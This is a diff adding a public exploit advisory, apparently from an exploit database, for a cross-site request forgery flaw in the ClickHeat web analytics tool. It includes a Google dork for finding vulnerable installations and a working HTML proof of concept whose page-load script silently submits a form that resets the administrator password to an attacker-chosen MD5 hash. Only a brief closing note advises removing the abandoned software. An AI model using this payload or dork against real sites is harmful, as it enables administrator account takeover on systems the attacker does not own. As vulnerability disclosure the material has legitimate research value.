@@ -1,0 +1,51 @@
+# Exploit Title: ClickHeat <1.1.4 Change Admin Password CSRF
+# Google Dork: allinurl:/clickheat/
+# Date: 11-06-2015
+# Exploit Author: David Shanahan (@CyberpunkSec)
+# Contact: https://twitter.com/CyberpunkSec
+# Vendor Homepage: http://www.labsmedia.com/clickheat/index.html
+# Software Link: http://sourceforge.net/projects/clickheat/files/clickheat/
+# Version: 1.14
+# Tested on: Windows
+
+---- Description ----
+
+ClickHeat is vulnerable to a CSRF attack because it does not implement a
+CSRF token when updating the config file.  If an authenticated admin is
+tricked into opening this malicious URL, the form will be submitted which
+changes the administrator password to the one the attacker has specified.
+
+---- CSRF PoC ----
+
+Set the value of "adminLogin" to the administrators username, then set the
+value of "adminPass" to a md5 hash of the password you want. (you may also
+need to change the "logPath" & "cachePath")
+
+/* CODE */
+
+<body onload="document.forms[0].submit()">
+
+<form action="http://127.0.0.1/clickheat/index.php?action=config"
+method="post" class="center">
+<input type="hidden" name="config" value="a:23:{s:7:"logPath";s:31:"C:/xampp
+/htdocs/clickheat/logs/";s:9:"cachePath";s:32:"C:/xampp/htdocs/clickheat
+/cache/";s:8:"referers";b:0;s:6:"groups";b:0;s:8:"filesize";i:0;s:10:"
+adminLogin";s:5:"admin";s:9:"adminPass";s:32:"
+5f4dcc3b5aa765d61d8327deb882cf99";s:11:"viewerLogin";s:0:"";s:10:"viewerPass
+";s:0:"";s:6:"memory";i:128;s:4:"step";i:5;s:3:"dot";i:19;s:5:"flush";i:40;s:5:"start";s:1:"m";s:7:"palette";b:0;s:7:"
+heatmap";b:1;s:11:"hideIframes";b:1;s:11:"hideFlashes
+";b:1;s:9:"yesterday";b:0;s:5:"alpha";i:80;s:13:"__screenSizes
+";a:10:{i:0;i:0;i:1;i:240;i:2;i:640;i:3;i:800;i:4;i:1024;i:5;i:1152;i:6;i:1280;i:7;i:1440;i:8;i:1600;i:9;i:1800;}s:14:"__
+browsersList";a:7:{s:3:"all";s:0:"";s:4:"msie";s:17:"Internet
+Explorer";s:7:"firefox";s:7:"Firefox";s:6:"chrome";s:6:"Chrome";s:6:"safari";s:6:"Safari";s:5:"opera";s:5:"Opera";s:7:"unknown";s:0:"";}s:7:"version";s:4:"1.14";}"
+/>
+<input type="hidden" name="save" value="true" /><input type="submit"
+value="Save configuration" /></form>
+
+/* CODE */
+
+---- Solution ----
+
+The ClickHeat project seems to be dead, as it has not been updated since
+late 2011.  Due to this, I truly doubt a patch will be issued so I would
+recommend removing this product from your website.
